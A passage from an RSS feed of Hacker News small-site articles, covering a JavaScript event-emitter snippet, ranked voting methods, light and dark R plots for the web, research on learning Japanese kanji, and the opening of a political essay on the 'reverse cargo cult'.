  <span>subscribe</span><span>:</span> <span>function</span><span>(</span><span>event<span>,</span> callback</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span><span>this</span><span>.</span>events<span>[</span>event<span>]</span><span>)</span> <span>this</span><span>.</span>events<span>[</span>event<span>]</span> <span>=</span> <span>[</span><span>]</span>
    <span>this</span><span>.</span>events<span>[</span>event<span>]</span><span>.</span><span>push</span><span>(</span>callback<span>)</span>
  <span>}</span>
<span>}</span>

module<span>.</span>exports <span>=</span> <span>{</span> EventEmitter <span>}</span></code></pre></div>
<p>If I want to handle any operation regarding events I just import this object and use its methods.</p>
<h4><code>index.js</code></h4>
<div data-language="javascript"><pre><code><span>import</span> <span>{</span> EventEmitter <span>}</span> <span>from</span> <span>'./../utils/eventEmitter.js'</span><span>;</span>

<span>const</span> data <span>=</span> <span>{</span>
  name<span>:</span> <span>'Andy'</span><span>,</span>
  age<span>:</span> <span>50</span>
<span>}</span><span>;</span>

<span>const</span> <span>emitChange</span> <span>=</span> <span>data</span> <span>=&gt;</span> <span>{</span>
  EventEmitter<span>.</span><span>dispatch</span><span>(</span><span>'change'</span><span>,</span> data<span>)</span>
<span>}</span><span>;</span></code></pre></div>
<h4><code>navigation.js</code></h4>
<div data-language="javascript"><pre><code><span>import</span> <span>{</span> EventEmitter <span>}</span> <span>from</span> <span>'./../utils/eventEmitter.js'</span><span>;</span>

EventEmitter<span>.</span><span>subscribe</span><span>(</span><span>'change'</span><span>,</span> <span>event</span> <span>=&gt;</span> <span>{</span>
   
<span>}</span><span>)</span><span>;</span></code></pre></div>
<h2>Conclusion</h2>
<p>Using custom events allows writing more flexible and reusable code. We can decide what part of the code should be executed and perform all actions in a desired and predictable way.</p></div></div>]]>
            </description>
            <link>https://michalmuszynski.com/blog/custom-events-in-javascript/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25717694</guid>
            <pubDate>Sun, 10 Jan 2021 18:22:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ranked Voting Systems]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25717646">thread link</a>) | @Elzear
<br/>
January 10, 2021 | https://www.elzear.de/posts/2021-01-10-polls | <a href="https://web.archive.org/web/*/https://www.elzear.de/posts/2021-01-10-polls">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The <a href="https://ncase.me/ballot/">spoiler effect</a> in elections frustrates me.
I wish my preferred candidates would not <em>“<!-- -->steal<!-- -->”</em> votes from each other.
And I wish I would never have to lie about my preferences for my vote to count.</p><p>Elections are unfair.<br><span>🗳️ 😠 📊 <span>😤</span></span><br>How to prevent dishonesty as a winning strategy?</p><p>Let's discover several election systems which
better reflect the voters' opinions.
This article partially answers the
question: <strong>how to fairly gather the preferences
of a group of voters to select a winner?</strong></p><p>No information from this post is new.
Most of the content is heavily
inspired from the following sources:</p><ul><li>the <a href="https://en.wikipedia.org/wiki/Electoral_system">Wikipedia article on electoral systems</a>,</li><li>the <a href="http://dss.in.tum.de/files/brandt-research/voting_slides.pdf">presentation of Practical Voting Rules</a>
and other online documents from <a href="https://dss.in.tum.de/staff/brandt.html">Dr Felix Brandt</a>,</li><li>YouTube videos: <a href="http://www.cgpgrey.com/politics-in-the-animal-kingdom/">Politics In The Animal Kingdom</a> from CGP Grey and
<a href="https://www.youtube.com/playlist?list=PLtzmb84AoqRSmv5o-eFNb3i9z64IuOjdX">La démocratie sous l'angle de la théorie des jeux</a>
(yes, it is in French) by Science4All,</li></ul><p>This blog post is a simple introduction to ranked voting systems and a presentation of a few voting methods:</p><p>Discover<br>ranked 🥇🥈🥉<br>election systems</p><h2><p><a href="#the-problem-space"><span role="img" aria-label="link"></span></a>The problem space</p></h2><figure><div><p><img alt="xkcd voting referendum (https://xkcd.com/2225/)" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><figcaption><a href="https://xkcd.com/2225/">xkcd: Voting Referendum</a></figcaption></figure><p>In real-world elections, we are generally unable to express our entire preference order. Most of the time, we are
only able to select one single candidate with our ballot. This leads us to lie about our preferences,
for example when a vote would be <em>“wasted”</em> on an underdog (this is the spoiler effect).
Elections could be fairer if voters would be able to indicate their full preference order!
It could then be taken into account and better reflect people's opinions.
Also, entering all preferences in one ballot allows us to compute elections of multiple rounds at once,
without having to force the voters to cast multiple ballots for the same election.</p><p>There are 2 main ways to record voters' opinion:</p><ul><li><p><strong>ranked voting</strong>: each voter can submit an order of preference between the candidates</p></li><li><p><strong>cardinal voting</strong>: each voter grades the candidates on a scale. For example rating all candidates
between 0 and 5.</p></li></ul><figure>Number the boxes in order of your choice<ul><li><span><span>4</span></span> <!-- -->Hayden Kelly</li><li><span><span>&nbsp;</span></span> <!-- -->Lesley Poole</li><li><span><span>4</span></span> <!-- -->Marley Bennett</li><li><span><span>3</span></span> <!-- -->Lesley Mills</li><li><span><span>&nbsp;</span></span> <!-- -->Erin Fraser</li><li><span><span>1</span></span> <!-- -->Brett Nielsen</li><li><span><span>4</span></span> <!-- -->Noel Curry</li><li><span><span>2</span></span> <!-- -->Vic Levy</li><li><span><span>&nbsp;</span></span> <!-- -->Tanner Fleming</li><li><span><span>2</span></span> <!-- -->Glen Hoffman</li></ul><figcaption>Example of a ranked ballot. The preferred candidate of this voter is Brett Nielsen</figcaption></figure><p>Even though cardinal voting has many supporters,
I dislike it for enabling voters to vote tactically: one can benefit from lying.
For example, by only giving extreme grades, a voter can have more impact than
others. Therefore this article will only focus on <strong>ranked voting</strong>.</p><ul><li><p>Voters can rank alternatives in a sequence, possibly with ties. Ballots contain ranked (not rated!) candidates.
The ballots accept ties: if voters are indifferent between two candidates, they can put them in
the same rank in their ballots.</p></li><li><p>The goal of the vote is to compute a hierarchy among the alternatives along with a winner.
This means the vote can select options like a restaurant for the evening, a president<!-- -->…<!-- -->
Proportional representation, like electing a parliament, is not a subject of this article.</p></li><li><p>For the sake of simplicity, ties and tie-breakers are ignored in this article. The
examples were chosen not to result in tied situations.</p></li></ul><h2><p><a href="#5-simple-voting-systems"><span role="img" aria-label="link"></span></a>5 simple voting systems</p></h2><p>Let<!-- -->'<!-- -->s consider an election in the animal world
(copying CGP Grey's videos) with a
particular voting scenario invented by Michel Balinski,
a mathematician, economist and political scientist.</p><p>This is a virtual election with <strong>100 voters</strong> and <strong>5
candidates</strong>: <span><span><span>🐸</span> <!-- -->Frog</span></span>, <span><span><span>🐷</span> <!-- -->Pig</span></span>, <span><span><span>🦁</span> <!-- -->Lion</span></span>, <span><span><span>🐻</span> <!-- -->Bear</span></span> and <span><span><span>🐭</span> <!-- -->Mouse</span></span></p><p>The voters can be gathered in 6 groups, each having the same preference order.
The preferences of all the voters are represented in this array
(which must be read as <em>“33 voters (first column) rank Frog first, then Pig,
then Lion, then Bear and finally Mouse is their least favourite;
16 voters (second column) rank Pig first, then Bear, then Lion; etc.”</em>):</p><p>We can compare some voting systems using this preference profile as an input.</p><h3><p><a href="#first-past-the-post"><span role="img" aria-label="link"></span></a>First past the post</p></h3><p>Probably the most basic voting method. Only the first choice of each voter matters
and we simply count the votes.
It is used in elections in many countries (the USA, the UK, Canada...).</p><p>With the voting system <strong>first past the post</strong>: Frog gets
33 votes, which is better than any other candidates. <span><span><span>🐸</span> <!-- -->Frog</span></span> wins.</p><p>This result can feel unfair because voters'
preferences are hardly taken into account. Frog won because it is ranked first by the biggest
group (33%), but it is also ranked last by the majority of voters (56%)!
That 56% (who ranked Frog last) could potentially come together before the start of the vote and agree on their
preferred candidate — which would be Mouse — to prevent Frog from being elected.</p><h3><p><a href="#contingent-vote-two-round-run-off"><span role="img" aria-label="link"></span></a>Contingent vote / Two-round run-off</p></h3><p>With these methods,
if no candidate receives 50% of the votes in the first round,
a second round of voting is held with only the top two candidates.</p><p>The Contingent vote lets voters cast their preference order at once and the winner can be computed
without needing another vote.</p><p>In two-round run-off elections, voters are only asked about their preferred candidate. They
have to vote again in the second round.
47 countries (Finland, France, Russia, Turkey...) use this system for their presidential elections.</p><p>A candidate
ranked last by more than 50%
of the voters cannot be elected by these methods.</p><p>With the voting system <strong>two-round run-off</strong>:
Frog and Mouse compete in the second round
and <span><span><span>🐭</span> <!-- -->Mouse</span></span> wins with 64% of the votes.</p><p>But Mouse is still the second most disliked candidate:
if we remove the most disliked candidate (Frog),
we are left with 52% of the voters ranking Mouse last!
Those voters can understandably be unsatisfied and ask
for a different system to be used.</p><h3><p><a href="#instant-run-off"><span role="img" aria-label="link"></span></a>Instant Run-off</p></h3><p>Counting only the first choices of the voters,
the candidate with the fewest votes is eliminated.
The election repeats until there is a winner.
It is used for example to elect members of the Australian House of Representatives,
the president of India and the president of Ireland.</p><p>Lion is eliminated first, then Pig, then Mouse,
then Frog. The final winner of the instant run-off vote is <span><span><span>🐻</span> <!-- -->Bear</span></span>.</p><p>Knowing the outcome of that vote, some groups could have
changed their ballots to prevent Bear's election. For
example, the 33%-group could decide to rank Pig first, and provoke
the election of Pig instead of Bear!</p><p>Coombs' rule is a similar voting method where the candidate ranked last by most voters gets eliminated
each round.
This rule would elect Pig.</p><h3></h3><p>For each voter, every candidate is given points
corresponding to their rank in the voter's preferences.
In our case: the first position gets 5 points, the second position gets
4 points<!-- -->…<!-- -->
It is currently used to elect members of the Parliament of Nauru
and two ethnic minority members of the National Assembly of Slovenia.</p><p>With <strong>Borda<!-- -->'<!-- -->s rule</strong>: <span><span><span>🐷</span> <!-- -->Pig</span></span> wins
with 347 points, and Lion is second with 344 points.</p><p>If the voters knew that the race would be so close between Pig and Lion,
they probably would have tried to influence the election by ranking them
as the first or the last in their ballots. Since 51% of the voters prefer Lion to Pig,
they can change the outcome of the election.
This kind of phenomenon often leads political systems to be bipartisan.</p><h3><p><a href="#copelands-method"><span role="img" aria-label="link"></span></a>Copeland's method</p></h3><p>Finally, someone found the perfect voting system for this election!
Copeland's method considers all duels between the candidates and
counts the number of victories, similarly to a tournament.</p><p>(Click on the array cells to show the duels)</p><p>Wins count:<br><span><span><span>🐸</span> Frog: 0</span></span> <span><span><span>🐷</span> Pig: 3</span></span> <span><span><span>🦁</span> Lion: 4</span></span> <span><span><span>🐻</span> Bear: 2</span></span> <span><span><span>🐭</span> Mouse: 1</span></span></p><p>Using <strong>Copeland<!-- -->'<!-- -->s method</strong>: <span><span><span>🦁</span> <!-- -->Lion</span></span> wins.
In fact, Lion wins all the duels, this is called a <em><strong>Condorcet winner</strong></em>.
Interestingly, this candidate was never selected as a winner
by the other real-world voting methods even though it wins all duels!
The voters of this election are finally happy thanks to Copeland<!-- -->'<!-- -->s method:
the winner of all duels wins the election, everything is perfectly logical.</p><p><strong>Did you notice? The 5 voting systems gave 5 different winners while the electors
did not change their preferences! <span>🤯</span></strong></p><h2><p><a href="#condorcet"><span role="img" aria-label="link"></span></a>Just pick the candidate winning all duels?! — Condorcet winners and Condorcet paradox</p></h2><h3><p><a href="#preference-graphs"><span role="img" aria-label="link"></span></a>Preferences graph helps to visualize duels</p></h3><p>To visualize the duels, it is helpful to simplify the representation of the input by
using a graph instead of an array of preferences.</p><p>The preference of the first group of voters (33%: Frog → Pig → Lion → Bear → Mouse) can be represented like this:</p><p>Adding the preferences of all the voters, we get the full graph:</p><p>Did I say <em>simplify</em>? 😬<br>
We can still combine opposed edges, which makes it way more readable:</p><p><span><span><span>🦁</span> <!-- -->Lion</span></span>, with all edges going outwards, is the <strong>Condorcet winner</strong> (winner of all duels).</p><h3><p><a href="#condorcet-paradox"><span role="img" aria-label="link"></span></a>Condorcet paradox</p></h3><p>After seeing Copeland<!-- -->'<!-- -->s method, you may think
<em>“Just pick the candidate that wins all duels!”</em>.
It would be great if this was always possible, but unfortunately,
there are situations where no candidate wins all duels and
a cycle appears.</p><figure><div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>“<strong>Transitive</strong> preference order” means: if I prefer <em>a</em> to <em>b</em> and <em>b</em> to <em>c</em>, then I also prefer <em>a</em> to <em>c</em>.</p></figure><p>Using a ranked voting method, each voter submits a ballot with
a transitive preference of the candidates.
Given that voters submit a clear hierarchical order,
why can<!-- -->'<!-- -->t voting systems simply agree on a winner?
Why is it so hard to aggregate voters<!-- -->'<!-- --> preference orders?
Can<!-- -->'<!-- -->t Copeland's method always be used?</p><p>With 3 candidates or more, problems may start to arise since
some collective preferences can be cyclic. Here is an example
of a vote for the best food. 15 voters
are deciding between the following candidates: <span><span><span>🌯</span> <!-- -->Burrito</span></span>, <span><span><span>🍔</span> <!-- -->Burger</span></span>, <span><span><span>🍕</span> <!-- -->Pizza</span></span>, <span><span><span>🍪</span> <!-- -->Cookie</span></span>.</p><p>This preference profile can also be represented in the below form, as we
saw previously:</p><p>Or as an array of duels:</p><p>Or as a graph of duels:</p><p>It shows that no alternative wins all pairwise duels:
There is a cycle between <span><span><span>🍔</span> <!-- -->Burger</span></span>, <span><span><span>🍕</span> <!-- -->Pizza</span></span> and <span><span><span>🍪</span> <!-- -->Cookie</span></span>,
this vote has no Condorcet winner.
In this kind of scenario, it is not obvious who should win.</p><h2><p><a href="#4-condorcet-voting-systems"><span role="img" aria-label="link"></span></a>4 Condorcet voting systems</p></h2><p>The <strong>Copeland</strong> voting system, which we saw above, validates the Condorcet criteria.
Some more complex voting systems can  validate the Condorcet criterion
and also score better on …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.elzear.de/posts/2021-01-10-polls">https://www.elzear.de/posts/2021-01-10-polls</a></em></p>]]>
            </description>
            <link>https://www.elzear.de/posts/2021-01-10-polls</link>
            <guid isPermaLink="false">hacker-news-small-sites-25717646</guid>
            <pubDate>Sun, 10 Jan 2021 18:19:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dynamic Light and Dark Plots in Web Using R]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25717614">thread link</a>) | @amirmasoudabdol
<br/>
January 10, 2021 | https://amirmasoudabdol.github.io/sfthemes/articles/dynamic_light_and_dark_plots_in_web.html | <a href="https://web.archive.org/web/*/https://amirmasoudabdol.github.io/sfthemes/articles/dynamic_light_and_dark_plots_in_web.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    

    
    
<p>Nowadays, most modern web browsers can detect users system preferences and notify a website to deliver an accessible and customized experience to the visitors. Recently, I developed <a href="https://amirmasoudabdol.github.io/preferably">preferably</a> to take advantages of this, and customize <code>pkgdown</code> websites based on user’s preferred system appearances, e.g., <em>light/dark mode</em>. However, background and text colors are not the only elements of a website that should be adjust based on users’ preferences, figures and plots should adapt their appearances as well. Fortunately, it is possible to provide two versions of a same image and inform browsers on when to use one instead of the other. For instance, as you can see below, a light themed plot is used in the light version of the website, and a dark themed plot in the dark version.</p>
<p><img src="https://amirmasoudabdol.github.io/sfthemes/articles/images/dynamic-light-and-dark-static.png"></p>
<p>While changing the text and background color can be “easily” adjusted using CSS, creating two similar, compatible, and optimized plots for light and dark appearances is not straightforward. You need a set of light/dark theme, and a collection of compatible, and optimized color scales in order to be able to deliver a <em>seamless</em> experience.</p>
<p>Here, I describe how you can achieve this behavior using my custom pkgdown template, <a href="https://amirmasoudabdol.github.io/preferably">preferably</a>, and sfthemes.</p>
<div id="instruction">
<h2>
<a href="#instruction"></a>Instruction</h2>
<p>So, as I mentioned, what we need is two versions of the same plot, each optimized for light and dark appearance, and a method of delivering them based on the user’s system preference.</p>
<div id="creating-lightdark-plots">
<h3>
<a href="#creating-lightdark-plots"></a>Creating Light/Dark Plots</h3>
<p>As shown <a href="https://amirmasoudabdol.github.io/index.html#light-and-dark-themes">here</a>, you can produce two variants of your visualization by using <code><a href="https://amirmasoudabdol.github.io/sfthemes/reference/theme_sf_light.html">theme_sf_light()</a></code> and <code><a href="https://amirmasoudabdol.github.io/sfthemes/reference/theme_sf_dark.html">theme_sf_dark()</a></code> themes, and your selected color scheme in light and dark mode.</p>


</div>
<div id="markdown-integration">
<h3>
<a href="#markdown-integration"></a>Markdown Integration</h3>
<p>Now that we have our plots, we can use HTML’s <a href="https://www.w3schools.com/TAgs/att_source_srcset.asp"><code>&lt;picture&gt;</code> and <code>&lt;source&gt;</code></a> tags and set a different image to <code>&lt;img href=“”&gt;</code> based on website’s appearance. For example, the code block below makes sure that <code>theme-sf-dark.png</code> will be the source when the user seeing a dark version of the website.</p>
<div id="cb2"><pre><code><span id="cb2-1"><a href="#cb2-1"></a><span>&lt;picture&gt;</span></span>
<span id="cb2-2"><a href="#cb2-2"></a>    <span>&lt;source</span><span> srcset=</span><span>"reference/figures/theme-sf-dark.png"</span><span> media=</span><span>"(prefers-color-scheme: dark)"</span><span>/&gt;</span></span>
<span id="cb2-3"><a href="#cb2-3"></a>    <span>&lt;img</span><span> src=</span><span>"man/figures/theme-sf-light.png"</span><span>/&gt;</span></span>
<span id="cb2-4"><a href="#cb2-4"></a><span>&lt;/picture&gt;</span></span></code></pre></div>
<p>Don’t be alarmed by the use of HTML, you don’t necessarily need to edit your HTML files, in fact, you can just write this inside your markdown files. Most Markdown parsers are smart enough to detect this as a piece of HTML code, and simply inject it into the rendered HTML. For instance, you can see that <a href="https://github.com/amirmasoudabdol/sfthemes/blob/main/vignettes/dynamic_light_and_dark_plots_in_web.Rmd">this page</a> is generated using from a markdown file, using <code>rmarkdown</code>.</p>
<p>The figure below is created using the above snippet, and will change based on your preference.</p>
<p><picture><source srcset="https://amirmasoudabdol.github.io/sfthemes/reference/figures/front-page-sample-dark.png" media="(prefers-color-scheme: dark)"><img src="https://amirmasoudabdol.github.io/sfthemes/reference/figures/front-page-sample-light.png"></picture></p>
</div>
</div>
  </div>

  

</div></div>]]>
            </description>
            <link>https://amirmasoudabdol.github.io/sfthemes/articles/dynamic_light_and_dark_plots_in_web.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25717614</guid>
            <pubDate>Sun, 10 Jan 2021 18:18:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Research-Based Methods for Learning Japanese]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25717393">thread link</a>) | @sova
<br/>
January 10, 2021 | https://japanesecomplete.com/articles/?p=1282 | <a href="https://web.archive.org/web/*/https://japanesecomplete.com/articles/?p=1282">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<h3><strong>Conclusions</strong> from the Academic Research</h3>



<p>We looked at research papers from the last 30 years to evaluate our set of teaching strategies undertaken in our Japanese language learning application called <a href="https://japanesecomplete.com/">Japanese Complete</a>.  We found that the scholarly and academic studies referred to confirm:</p>



<ol><li><strong>Kanji [logographs of mainland Asian origin] are categorized as the main impediment in acquisition of the Japanese language</strong> and anything to ease their acquisition from rote-memorization will help learners greatly.</li><li><strong>Computer aided learning of Japanese is superior to textbook-based</strong> learning <strong>when</strong> <strong>paired with timely and useful feedback</strong> for the learner, with politeness language, grammar, kanji, and more. [4, 5, 7, 12, 17]</li><li><strong>Kanji are processed by different parts of the brain compared to English letters and Hiragana mora,</strong> suggesting that placing special emphasis on learning Kanji as glyphs or <em>graphics with associated meanings <strong>first</strong></em> establishes a firm foundation upon which to then learn readings and pronunciations. [2, 6]</li><li>Kanji have <em>logographic</em> as well as <em>phonographic</em> value; <strong>cultural, etymological, and mnemonic strategies are not only more effective than rote-memorization strategies for learning, they also remove a lot of anxiety and perceived inscrutability of kanji, making kanji learning fun and intriguing</strong> instead of a chore.  The main techniques presented in these papers include component-analysis of kanji [what we call subkanji learning], and pairing kanji with graphical and mnemonic aides such as stories or imaginal scenes. [6, 7, 10, 11, 14, 15]</li><li>It is very likely that native speakers of languages featuring kanji create <em>some sort</em> of meaning-word associated with each kanji, whether able to give voice to it or not (“unconscious knowledge”), suggesting strongly that <strong>by teaching kanji meaning-words first one is creating a very helpful and direct shortcut to their successful assimilation.</strong> [6, 9, 10]</li><li>One paper suggests the use of an “orthographic gradient” where terms are first shown as color-coded Hiragana, and later instances are shown as color-coded kanji using the same coloration, allowing learners to make an implied association of equality.  <strong>This idea of “orthographic gradient” confirms the efficacy of our innovative approach “Kanji in English Context” where we t取ke kanji and pl置ce them in an 英ngl語sh c文nt脈xt [take, place, English, context] to expedite acquisition</strong> and increase familiarity with the plurality of [English] words kanji can represent. [11, 16]</li><li><strong>Acquisition of Japanese grammar and sequence continues to be the most challenging part of learning the language for 1st, 2nd, and 3rd year students,</strong> suggesting that the focus for the first several semesters of learning ought be grammar-focused.  Nouns are acquired at a linear rate no matter the level of grammar competency, and thus it would suggest that the learning of nouns can actually be greatly delayed without any negative impact on comprehension; rather, focus on grammar first would result in greatly improved comprehension when nouns are later added to one’s cogent grammar understanding. </li><li><strong>Very Accurate Japanese Pitch Accent</strong> can be trained and learned swiftly with the right learning materials (showing pitch contours on screen and having learners listen and repeat). [17]</li><li><strong>One’s native language shapes how one acquires second+ languages.</strong> [3, 13]</li></ol>



<figure><img src="http://jpc0.b-cdn.net/img/lake-onami.jpg" alt=""><figcaption>Lake Onami</figcaption></figure>



<h3><br><strong>Scholarly and Academic Works Cited</strong></h3>



<hr>



<p>[1] <em><strong>Phonological processing of Japanese Kanji and Chinese characters in bilingual Japanese : An fMRI study (2017)</strong></em></p>



<p><a href="https://ieeexplore.ieee.org/document/8015970" target="_blank" rel="noreferrer noopener">https://ieeexplore.ieee.org/document/8015970</a></p>



<p>“The result showed that our bilingual Japanese subjects have large overlaps in the neural substrates for phonological processing of both native and second language.  Our finding supports the idea that the neural systems of second language reading are shaped by native language.” </p>



<hr>



<p>[2] <em><strong>Japanese and English sentence reading comprehension and writing systems: An fMRI study of first and second language effects on brain activation. (2009)</strong></em></p>



<p><a href="https://pubmed.ncbi.nlm.nih.gov/19946611/" target="_blank" rel="noreferrer noopener">https://pubmed.ncbi.nlm.nih.gov/19946611/</a></p>



<p>Parts of the brain that are engaged when native Japanese readers process English, Hiragana, and Kanji:</p>



<figure><img src="https://www.ncbi.nlm.nih.gov/pmc/articles/instance/2782536/bin/nihms120575f4.jpg" alt=""><figcaption>Activation regions for native Japanese speakers decoding written language.</figcaption></figure>



<p>“Functional magnetic resonance imaging (fMRI) was used to compare brain activation from Japanese readers reading hiragana (syllabic) and kanji (logographic) sentences, and English as a second language (L2). Kanji showed more activation than hiragana in right-hemisphere occipito-temporal lobe areas associated with visuospatial processing; hiragana, in turn, showed more activation than kanji in areas of the brain associated with phonological processing. L1 results underscore the difference in visuospatial and phonological processing demands between the systems. Reading in English as compared to either of the Japanese systems showed more activation in inferior frontal gyrus, medial frontal gyrus, and angular gyrus. The additional activation in English in these areas may have been associated with an increased cognitive demand for phonological processing and verbal working memory.”</p>



<hr>



<p>[3] <em><strong>Comparative Spatial Semantics and Language Acquisition:Evidence from Danish, English, and Japanese (1994)</strong></em></p>



<p><a href="https://www.researchgate.net/profile/Chris-Sinha/publication/249234936_Comparative_Spatial_Semantics_and_Language_Acquisition_Evidence_from_Danish_English_and_Japanese/links/57da79a508ae72d72ea2b8b8/Comparative-Spatial-Semantics-and-Language-Acquisition-Evidence-from-Danish-English-and-Japanese.pdf" target="_blank" rel="noreferrer noopener">https://www.researchgate.net/profile/Chris-Sinha/publication/249234936_Comparative_Spatial_Semantics_and_Language_Acquisition_Evidence_from_Danish_English_and_Japanese/links/57da79a508ae72d72ea2b8b8/Comparative-Spatial-Semantics-and-Language-Acquisition-Evidence-from-Danish-English-and-Japanese.pdf</a></p>



<p>“Perhaps the most important finding is that in all three languages that we have analysed acquisition appears to take place in two phases, during the first of which the child gradually acquires six to eight simple forms corresponding to ‘basic’ spatial meanings encoded in the target language.”</p>



<p>“In the second phase of acquisition, the child’s productive repertoire and the frequency of its use increase in a way that is reminiscent of (though perhaps less dramatic than) the ‘vocabulary explosion’ in nominal usage. The extension of the repertoire takes different courses, depending on the structure of the target language. In all languages it can be expected that the repertoire within the form class which is dominant in expressing spatial relational meaning will continue to expand, and that this will remain the most frequently employed vehicle for the child’s expression of spatial relational meaning throughout and perhaps beyond the third year of life.”</p>



<p>“In languages, such as Japanese, in which spatial relational meaning is overtly distributed over different form classes, the second phase will involve both an increase in the range of types controlled in the dominant form class (in this case,verbs), and the extension of the acquisition process to the other form classes (in this case, particles and nouns). Both the slow pace of acquisition in the non-dominant forms classes, and the fact that the meanings initially expressed using nouns are cognate with those already expressed using verbs, suggest that, in Japanese too, the learning process continues to be governed in the second phase by a conservative strategy. It can perhaps be seen as follows: the child employs the already acquired meanings as clues for the establishment of new centres in new form classes for the repetition with respect to these new form classes of the radial strategy already successfully employed with respect to the dominant form class.”</p>



<hr>



<p>[4] <strong><em>Supporting the acquisition of Japanese polite expressions in context-aware ubiquitous learning</em> <em>(2010)</em></strong></p>



<p><a href="http://www.academia.edu/download/50315553/ijmlo.2010.03263720161114-19604-1c5exmp.pdf">http://www.academia.edu/download/50315553/ijmlo.2010.03263720161114-19604-1c5exmp.pdf</a></p>



<p>“To support the foreigners learning JPE [Japanese Politeness Expressions], a PDA-based context-aware language learning support environment was proposed. This environment supports the learners to learn JPE according to the different situations in the real world. There are two version of the prototype system for this environment. In this paper, design, implementation and evaluation of JAPELAS2 are presented. From the experiment, we found the system provides the correct polite-expression based on hyponymy, social distance and situation through the identification of the target user and the location. The experiment showed that the system was quite useful and using this system made understanding the appropriate level of politeness easy by changing roles and situations.”</p>



<figure><img loading="lazy" width="645" height="641" src="https://japanesecomplete.com/articles/wp-content/uploads/2021/01/Screen-Shot-2021-01-06-at-4.13.32-PM.png" alt=""></figure>



<hr>



<p>[5] <em><strong>COMPUTER VS. WORKBOOK INSTRUCTION IN SECOND LANGUAGE ACQUISITION (1996)</strong></em></p>



<p><a href="https://journals.equinoxpub.com/CALICO/article/viewFile/23393/19398">https://journals.equinoxpub.com/CALICO/article/viewFile/23393/19398</a></p>



<p>“The results of the study show that given the same grammar notes and exercises, <strong>ongoing intelligent computer feedback is more effective than simple workbook answer sheets for developing learners’ grammatical skill in producing Japanese particles and sentences.</strong> A significant difference between Nihongo-CALI and the workbook instruction was observed in the production tests but not in the comprehension tests. This is consistent with Flynn’s hypothesis that grammatical competence is less critical in comprehension than in production. As suggested by Pederson and Dunkel, the present study also confirms that the use of a medium (i.e., computer) alone does not bring better effects; rather the quality of the messages produced by the medium affects the result. This is based on the fact that the intelligent version of Nihongo-CALI is significantly more effective than the workbook instruction”</p>



<div><figure><img loading="lazy" width="411" height="333" src="https://japanesecomplete.com/articles/wp-content/uploads/2021/01/Screen-Shot-2021-01-06-at-4.19.44-PM.png" alt=""></figure></div>



<hr>



<p>[6] <em><strong>L2 learners’ attitudes toward, and use of, mnemonic strategies when learning Japanese Kanji (2013)</strong></em></p>



<p><a href="https://www.researchgate.net/publication/259551232_L2_learners%27_attitudes_toward_and_use_of_mnemonic_strategies_when_learning_Japanese_Kanji">https://www.researchgate.net/publication/259551232_L2_learners%27_attitudes_toward_and_use_of_mnemonic_strategies_when_learning_Japanese_Kanji</a></p>



<p>“This study investigated kanji learning (the memorization of Japanese written characters) of university students of Japanese, in order to evaluate students’ use of mnemonic strategies. The study applied …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://japanesecomplete.com/articles/?p=1282">https://japanesecomplete.com/articles/?p=1282</a></em></p>]]>
            </description>
            <link>https://japanesecomplete.com/articles/?p=1282</link>
            <guid isPermaLink="false">hacker-news-small-sites-25717393</guid>
            <pubDate>Sun, 10 Jan 2021 18:01:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS costs for a simple web application]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25717223">thread link</a>) | @michalbugno
<br/>
January 10, 2021 | https://michalbugno.pl/blog/2021-01-10-aws-costs-for-a-small-web-application.html | <a href="https://web.archive.org/web/*/https://michalbugno.pl/blog/2021-01-10-aws-costs-for-a-small-web-application.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://michalbugno.pl/blog/2021-01-10-aws-costs-for-a-small-web-application.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25717223</guid>
            <pubDate>Sun, 10 Jan 2021 17:47:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reverse Cargo Cult (2017)]]>
            </title>
            <description>
<![CDATA[
Score 132 | Comments 108 (<a href="https://news.ycombinator.com/item?id=25717075">thread link</a>) | @dredmorbius
<br/>
January 10, 2021 | https://hanshowe.org/2017/02/04/trump-and-the-reverse-cargo-cult/ | <a href="https://web.archive.org/web/*/https://hanshowe.org/2017/02/04/trump-and-the-reverse-cargo-cult/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

					<p>Trump administration lies constantly but doesn’t even attempt to make it seem like they aren’t lying.</p>
<p>After the collapse of the Soviet Union, this kind of cynicism was referred to as the “reverse cargo cult” effect.</p>
<p>In a regular cargo cult, you have people who see an airstrip, and the cargo drops, so they build one out of straw, hoping for the same outcome. They don’t know the difference between a straw airstrip and a real one, they just want the cargo.</p>
<p>In a reverse cargo cult, you have people who see an airstrip, and the cargo drops, so they build one out of straw. But there’s a twist:</p>
